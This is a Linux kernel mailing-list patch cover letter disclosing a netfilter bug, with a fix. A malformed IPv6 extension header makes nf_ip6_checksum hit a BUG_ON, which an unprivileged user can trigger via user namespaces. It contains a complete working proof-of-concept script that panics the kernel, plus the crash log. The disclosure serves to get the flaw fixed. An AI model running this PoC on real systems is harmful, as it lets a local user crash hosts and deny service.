Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E2EF33AEF45
	for <netfilter-devel@vger.kernel.org>; Fri, 18 Sep 2026 09:27:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789723649; cv=none; b=RwxiRBYZVPy1oh3dr8fh3sHKWy8z915bbauoxcxHFMUml0BT1a2P4uq9E/MeSvP3xe302R62lGQS8kCmN9bcOJVeK9OUHSBhxP+3ZPhF1bvz3ilnNS1NP+VWJ0RVRK0sBW9daXIAZhY6QDMVvgY4RSpDKHEVnPHDg9HurQd5BnU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789723649; c=relaxed/simple;
	bh=gUJ9K6zAGHDotXV43BDq/YT/wmvg3RVKoONW9V7DLqQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Mt2iaOx6P3rOUcQcX2QGPW3eZe/8L2l4S5EGY1rDYUbXfF8ZM7xCf+pCHdROdcZMWuXZOe3LywFsLiZTCCIJU7IBE/+aZYdHDimeG4e2hNY0U2p91REPq/+c6yXGoluJqosbqyEbRvBYekq1PDiqJm20mRZ0cNkI9EFxF7yAixg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=puWhWpzD; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="puWhWpzD"
Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-396ccd66bb4so477068a91.1
        for <netfilter-devel@vger.kernel.org>; Fri, 18 Sep 2026 02:27:26 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789723646; x=1790328446; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=v6jnrZpjSdJ5PD2BrwxLTqqm7YpV0s/w3jQvwggI6iM=;
        b=puWhWpzD5MltEwIKAA1XyhSwrOTx66kqxCskEh9KoCM6/9+4PrZdYu2/sF2HHyu97q
         MJhNcYgiM7j2pnc2siQHaJXo/qQ/PWK7FLpwZe/hCeD5uE4GwNIE/i2uZPLjAefxc9Yr
         iyQMhuZl49JMnvhmh1Dhevnf4d3eeF/rljTyvsfBuFhVWpLxBZKXfaMyIsWOgbmNwd1g
         ac66DU/JMgzER1Jt70A0nMlXSPR5xUL3aETaT7OufqKxuA6UVDithN6NciKSVtiztS3W
         8qf9dkbXR1emWxLj2rd7ZomLT/pLMAxhqcNaHZB6kvmrDeKczR9ZJJMJmtrDROrGUwCo
         hF4g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789723646; x=1790328446;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=v6jnrZpjSdJ5PD2BrwxLTqqm7YpV0s/w3jQvwggI6iM=;
        b=EfXpZdVqdDBHJamUpjL+2oupUbjZfTi2RWc439rgA4WachQcc8//n8D1cHLuK52Ov3
         Op1b6cGiVF4GuNR1yhWJHrRd1i3GBWQYp3zrYwnYbrxFYvUjld1TPIu4v9c1x9GVl0XL
         eazGwmiOFOy+wxW+43uacBP7hyVCx2dAbLMSdJlcuYUNdhyMoYJuBh8So/2q2dJ/vArk
         ubsQGpRFuvtcO6Qg94QdUhv2qNNdFMV/cwMZTR5i4U31bOmpDxdXBKfKDJL2WOoiYq37
         66taMhyHlROQ3Hdu9ztoQQoi0An9RSZ1LpYsbSrHwerJHhTtrWVGoRQhkKucvYZG6cpF
         4a6w==
X-Gm-Message-State: AFuF++kT81isjOtq117vsW9IEkFgiBClLotwcyAvwa9yslqoi29TxXCR
	NXKOqGOOmelo0q2H+eT4e3L6gvwEKaQ+gPK5QwL5TTbIMHI9QYTVaEtssPi9RZcAmp2VYO6mrMJ
	g3SpzVg==
X-Gm-Gg: AYBFou3VVidF4BuKPzJnsJf0N5A0KmU6DnImentI6FM/2xIjF4Eg7IFpr2j+i8ERm1L
	+WqupRkRGlBd7tiX6HJr4/BpiPchwhIWIF7DJ1KFeyLXiABxZF2jYTxw2KzFaVpsS4y/bV+7XR+
	dPLHkCb7oa/Nxm1/B555D8uVu+pwbdp6hUnQ+EYcsul+wdMyx3wqES3o+6vWCLzQV15QbWuOnSA
	5AhV+pLK5lpDmRdy9YHniUYkYJZQ4f1FyrdqROPNTtJ9K57AyAv+igGpJVBEZW8ehoW0ii6MDKh
	hYgyMENOUksTGuLW84ke9JNxOnKyCTiGF97CMSRok6bqu3B9il7CYjoKCTPoTMzcRiI5N34RS0n
	SQ6cRr54V//DUalng5dhf4vJcnJEyKEzomn/0U4fO6ZPxc9tjw1jGQQ6Dnz5HuyMyXaHfEW68In
	W8EZGftfHyBKiqa4rm70RhgHBQtZliF+zQ30T0CZNqDBaDea9//LRvT65X1raIUwDSGuYymuVdE
	DrKxB1z1g==
X-Received: by 2002:a17:90b:4e8c:b0:39b:2c55:365 with SMTP id 98e67ed59e1d1-39e54b457a8mr4608504a91.12.1789723645880;
        Fri, 18 Sep 2026 02:27:25 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e5a3e3dbcsm2285005a91.5.2026.09.18.02.27.18
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 18 Sep 2026 02:27:25 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	kaber@trash.net,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: nf_ip6_checksum: validate checksum offset
Date: Fri, 18 Sep 2026 17:26:51 +0800
Message-ID: <cover.1789660425.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/utils.c. The bug can be
reached by a non-root user when unprivileged user namespaces are enabled,
using user and network namespaces. We tested the fix in QEMU, and it does
not affect valid checksum handling or other tested functionality.

We will provide detailed information about the bug in this email,
along with a PoC to trigger it.

---- details below ----

Bug details:

nf_ip6_checksum() passes dataoff to skb_checksum() as the length argument
without checking that it does not exceed skb->len. A malformed IPv6
extension header can make ipv6_find_hdr() return an offset past the end of
the packet, causing the SYNPROXY target to hit the BUG_ON(len) in
skb_checksum().

The affected path is the IPv6 SYNPROXY target. nft_target_eval_xt() passes
the transport-header offset obtained from ipv6_find_hdr() to
synproxy_tg6(), which passes it to nf_ip6_checksum(). The PoC sends an IPv6
packet with an
8-byte Destination Options header whose hdrlen field is 255. The extension
header is therefore interpreted as 2048 bytes even though the skb contains
only the 8-byte header, producing an offset beyond skb->len.

The fix validates dataoff before checksum traversal and validates the
requested dataoff/len range in nf_checksum_partial(). It returns
CSUM_MANGLED_0 for invalid input. SYNPROXY treats the non-zero return as
a checksum failure and drops the packet before checksum traversal.

Reproducer:

    chmod +x ./poc.sh
    PATH=/usr/sbin:/usr/bin:/sbin:/bin ./poc.sh userns

The userns mode executes the setup through unshare -Urn. On systems that
allow unprivileged user namespaces, an ordinary user can create the veth
pair, install the IPv6 SYNPROXY rule, and inject the malformed packet from
the new network namespace. The crash log below is copied verbatim from the
original QEMU serial output. The patched PoC completed with exit status 0.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------
#!/bin/bash
set -euo pipefail

setup_rule() {
  ip link del veth0 2>/dev/null || true
  ip link add veth0 type veth peer name veth1
  ip link set lo up
  ip link set dev veth0 address 02:00:00:00:00:01
  ip link set dev veth1 address 02:00:00:00:00:02
  ip link set veth0 up
  ip link set veth1 up
  ip -6 addr add 2001:db8::1/64 dev veth0 nodad
  ip6tables -F INPUT
  ip6tables -A INPUT -i veth0 -p tcp -j SYNPROXY --sack-perm --timestamp --wscale 7 --mss 1460
}

send_packet() {
  python3 - <<'PY'
import socket
import struct

def mac(name):
    if name == "veth0":
        return bytes.fromhex("020000000001")
    if name == "veth1":
        return bytes.fromhex("020000000002")
    raise ValueError(name)

src_mac = mac("veth1")
dst_mac = mac("veth0")
eth = dst_mac + src_mac + struct.pack("!H", 0x86DD)

ver_tc_fl = 6 << 28
payload_len = 8
nexthdr = 60
hop_limit = 64
src = socket.inet_pton(socket.AF_INET6, "2001:db8::2")
dst = socket.inet_pton(socket.AF_INET6, "2001:db8::1")
ip6 = struct.pack("!IHBB16s16s", ver_tc_fl, payload_len, nexthdr,
                 hop_limit, src, dst)

# Destination Options header:
# - next header = TCP
# - hdrlen = 255 => ipv6_find_hdr() advances by 2048 bytes
#   even though only 8 option bytes are present in the skb.
dstopt = struct.pack("!BB6s", 6, 255, b"\x00" * 6)

pkt = eth + ip6 + dstopt
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("veth1", 0))
s.send(pkt)
print(f"sent {len(pkt)} bytes")
PY
}

run_root() {
  setup_rule
  send_packet
}

case "${1:-root}" in
  root)
    run_root
    ;;
  userns)
    export PATH=/usr/sbin:/usr/bin:/sbin:/bin
    unshare -Urn -- "$0" root
    ;;
  *)
    echo "usage: $0 [root|userns]" >&2
    exit 1
    ;;
esac
------END poc.sh--------

----BEGIN crash log----
[  269.487359][    C0] kernel BUG at net/core/skbuff.c:3570!
[  269.489186][    C0] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[  269.489744][    C0] CPU: 0 UID: 0 PID: 9833 Comm: python3 Not tainted 7.1.0-rc1 #2 PREEMPT(full)
[  269.490363][    C0] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  269.491100][    C0] RIP: 0010:skb_checksum+0x648/0x860
[  269.491616][    C0] Code: 50 5b 5d 41 5c 41 5d 41 5e 41 5f e9 ed f1 74 f8 90 0f 0b 90 31 db e9 ba fc ff ff 90 0f 0b 90 31 c0 eb b3 8b 44 24 04 eb a5 90 <0f> 0b 48 c7 c7 60 4f ea 8c e8 3a ae 82 f9 e9 7d fd ff ff 48 c7 c7
[  269.492939][    C0] RSP: 0018:ffa0000000007500 EFLAGS: 00010202
[  269.493370][    C0] RAX: 000000000000bcfe RBX: 0000000000000030 RCX: dffffc0000000000
[  269.493913][    C0] RDX: 00000000000007f8 RSI: ff1100007e7c4640 RDI: ff11000114a0e748
[  269.494435][    C0] RBP: 0000000000000000 R08: ff1100007e7c4580 R09: 0000000000000030
[  269.494974][    C0] R10: ff1100007e7c4600 R11: 0000000000000007 R12: ff11000114a0e740
[  269.495504][    C0] R13: ff1100007e7c460c R14: ff1100007e7c45f0 R15: 0000000000000030
[  269.496058][    C0] FS:  00007f1cd41b0780(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
[  269.496665][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  269.497109][    C0] CR2: 00000000004a84eb CR3: 000000010ce35000 CR4: 0000000000751ef0
[  269.497663][    C0] PKRU: 55555554
[  269.497909][    C0] Call Trace:
[  269.498132][    C0]  <IRQ>
[  269.498337][    C0]  ? find_held_lock+0x2b/0x80
[  269.498744][    C0]  nf_ip6_checksum+0x210/0x310
[  269.499103][    C0]  synproxy_tg6+0x1d7/0x640
[  269.499440][    C0]  ? __pfx_synproxy_tg6+0x10/0x10
[  269.499788][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.500208][    C0]  ? __pfx_nft_meta_pktinfo_may_update+0x10/0x10
[  269.500661][    C0]  ? __pfx_ref_tracker_alloc+0x10/0x10
[  269.501074][    C0]  ? dst_init+0x8e/0x540
[  269.501375][    C0]  ? dst_alloc+0x99/0x150
[  269.501684][    C0]  nft_target_eval_xt+0x1b7/0x2b0
[  269.502034][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.502414][    C0]  ? __pfx_nft_target_eval_xt+0x10/0x10
[  269.502794][    C0]  ? nft_counter_eval+0xe5/0x140
[  269.503116][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.503499][    C0]  ? rcu_is_watching+0x12/0xc0
[  269.503864][    C0]  ? __local_bh_enable_ip+0xa7/0x120
[  269.504251][    C0]  nft_do_chain+0x26e/0x1820
[  269.504588][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.504969][    C0]  ? ip6_pol_route+0x23a/0xe30
[  269.505300][    C0]  ? __pfx_nft_do_chain+0x10/0x10
[  269.505640][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.506024][    C0]  ? nf_ct_get_tuple+0x538/0x5f0
[  269.506370][    C0]  ? srso_alias_safe_ret+0x2/0x7
[  269.506687][    C0]  ? nf_ct_frag6_gather+0x330/0x27b0
[  269.507067][    C0]  nft_do_chain_ipv6+0x1a4/0x210
[  269.507411][    C0]  ? __pfx_nft_do_chain_ipv6+0x10/0x10
[  269.507779][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.508165][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.508546][    C0]  ? lock_acquire+0x1ab/0x360
[  269.508861][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.509243][    C0]  nf_hook_slow+0xac/0x1f0
[  269.509555][    C0]  nf_hook.constprop.0+0x1f7/0x510
[  269.509928][    C0]  ? __pfx_ip6_input_finish+0x10/0x10
[  269.510292][    C0]  ? __pfx_nf_hook.constprop.0+0x10/0x10
[  269.510681][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.511056][    C0]  ? __pfx_ip6_input_finish+0x10/0x10
[  269.511408][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.511775][    C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  269.512095][    C0]  ? process_backlog+0x3e9/0x1510
[  269.512449][    C0]  ip6_input+0xba/0x1f0
[  269.512729][    C0]  __netif_receive_skb_one_core+0x119/0x1b0
[  269.513130][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.513494][    C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  269.513932][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.514319][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.514709][    C0]  process_backlog+0x429/0x1510
[  269.515062][    C0]  __napi_poll.constprop.0+0x9f/0x440
[  269.515438][    C0]  net_rx_action+0x8f5/0xf40
[  269.515760][    C0]  ? __pfx_net_rx_action+0x10/0x10
[  269.516115][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.516504][    C0]  ? sched_clock_cpu+0x6c/0x530
[  269.516854][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.517238][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.517614][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.517995][    C0]  ? rcu_is_watching+0x12/0xc0
[  269.518324][    C0]  handle_softirqs+0x1ef/0xa00
[  269.518658][    C0]  ? __pfx_handle_softirqs+0x10/0x10
[  269.519008][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.519381][    C0]  ? irqtime_account_irq+0x17b/0x2d0
[  269.519749][    C0]  ? __dev_queue_xmit+0xb69/0x3ac0
[  269.520096][    C0]  do_softirq+0xb2/0xf0
[  269.520373][    C0]  </IRQ>
[  269.520573][    C0]  <TASK>
[  269.520770][    C0]  __local_bh_enable_ip+0x101/0x120
[  269.521103][    C0]  ? __dev_queue_xmit+0xb69/0x3ac0
[  269.521431][    C0]  __dev_queue_xmit+0xb7e/0x3ac0
[  269.521766][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.522127][    C0]  ? find_held_lock+0x2b/0x80
[  269.522442][    C0]  ? __pfx___dev_queue_xmit+0x10/0x10
[  269.522810][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.523185][    C0]  ? _copy_from_iter+0x120/0x14e0
[  269.523563][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.523948][    C0]  ? lock_acquire+0x1ab/0x360
[  269.524257][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.524638][    C0]  ? find_held_lock+0x2b/0x80
[  269.524949][    C0]  ? __pfx__copy_from_iter+0x10/0x10
[  269.525308][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.525696][    C0]  ? packet_parse_headers+0x337/0x6f0
[  269.526084][    C0]  ? __pfx_packet_parse_headers+0x10/0x10
[  269.526447][    C0]  ? skb_copy_datagram_from_iter+0x10d/0x730
[  269.526867][    C0]  packet_sendmsg+0x208a/0x48a0
[  269.527219][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.527618][    C0]  ? __pfx___might_resched+0x10/0x10
[  269.527994][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.528394][    C0]  ? __lock_acquire+0x45c/0x25f0
[  269.528728][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  269.529071][    C0]  ? __pfx_aa_sk_perm+0x10/0x10
[  269.529435][    C0]  __sys_sendto+0x34f/0x3a0
[  269.529760][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  269.530092][    C0]  ? __local_bh_enable_ip+0xa7/0x120
[  269.530442][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.530820][    C0]  ? lockdep_hardirqs_on+0x7b/0x110
[  269.531235][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.531610][    C0]  ? __sys_bind+0x16b/0x210
[  269.531935][    C0]  __x64_sys_sendto+0xe0/0x1c0
[  269.532257][    C0]  ? do_syscall_64+0x90/0xf80
[  269.532588][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  269.533003][    C0]  ? lockdep_hardirqs_on+0x7b/0x110
[  269.533350][    C0]  do_syscall_64+0x116/0xf80
[  269.533667][    C0]  ? irqentry_exit+0x117/0x830
[  269.533986][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  269.534378][    C0] RIP: 0033:0x7f1cd4244687
[  269.534711][    C0] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  269.535996][    C0] RSP: 002b:00007ffca2361d90 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  269.536550][    C0] RAX: ffffffffffffffda RBX: 00007f1cd41b0780 RCX: 00007f1cd4244687
[  269.537080][    C0] RDX: 000000000000003e RSI: 00007f1cd3c65c10 RDI: 0000000000000003
[  269.537608][    C0] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  269.538149][    C0] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  269.538645][    C0] R13: 0000000000000000 R14: 00000000006ff020 R15: 0000000000a83590
[  269.539212][    C0]  </TASK>
[  269.539416][    C0] Modules linked in:
[  269.539794][    C0] ---[ end trace 0000000000000000 ]---
[  269.540186][    C0] RIP: 0010:skb_checksum+0x648/0x860
[  269.540553][    C0] Code: 50 5b 5d 41 5c 41 5d 41 5e 41 5f e9 ed f1 74 f8 90 0f 0b 90 31 db e9 ba fc ff ff 90 0f 0b 90 31 c0 eb b3 8b 44 24 04 eb a5 90 <0f> 0b 48 c7 c7 60 4f ea 8c e8 3a ae 82 f9 e9 7d fd ff ff 48 c7 c7
[  269.541842][    C0] RSP: 0018:ffa0000000007500 EFLAGS: 00010202
[  269.542255][    C0] RAX: 000000000000bcfe RBX: 0000000000000030 RCX: dffffc0000000000
[  269.542780][    C0] RDX: 00000000000007f8 RSI: ff1100007e7c4640 RDI: ff11000114a0e748
[  269.543272][    C0] RBP: 0000000000000000 R08: ff1100007e7c4580 R09: 0000000000000030
[  269.543778][    C0] R10: ff1100007e7c4600 R11: 0000000000000007 R12: ff11000114a0e740
[  269.544309][    C0] R13: ff1100007e7c460c R14: ff1100007e7c45f0 R15: 0000000000000030
[  269.544858][    C0] FS:  00007f1cd41b0780(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
[  269.545452][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  269.545900][    C0] CR2: 00000000004a84eb CR3: 000000010ce35000 CR4: 0000000000751ef0
[  269.546427][    C0] PKRU: 55555554
[  269.546674][    C0] Kernel panic - not syncing: Fatal exception in interrupt
[  269.547305][    C0] Kernel Offset: disabled
[  269.547608][    C0] Rebooting in 86400 seconds..
-----END crash log-----

The crash log above is from the original QEMU run on 7.1.0-rc1. The clean
kernel used panic_on_warn=0, so this was not a warning promoted to a panic;
it was the BUG_ON in skb_checksum(). In the later clean/patched comparison,
both kernels used the same configuration on 7.3.0-rc2. The patched PoC
printed:

    sent 62 bytes
    POC_RC=0

The patched guest remained reachable as UID 1001. Its serial log contained
no BUG, Oops, panic, KASAN, or trigger-related Call Trace entries.

The patch changes one file:

    net/netfilter/utils.c | 6 ++++++
    1 file changed, 6 insertions(+)

Zixuan Chai (1):
  netfilter: nf_ip6_checksum: validate checksum offset

 net/netfilter/utils.c | 6 ++++++
 1 file changed, 6 insertions(+)

-- 
2.34.1

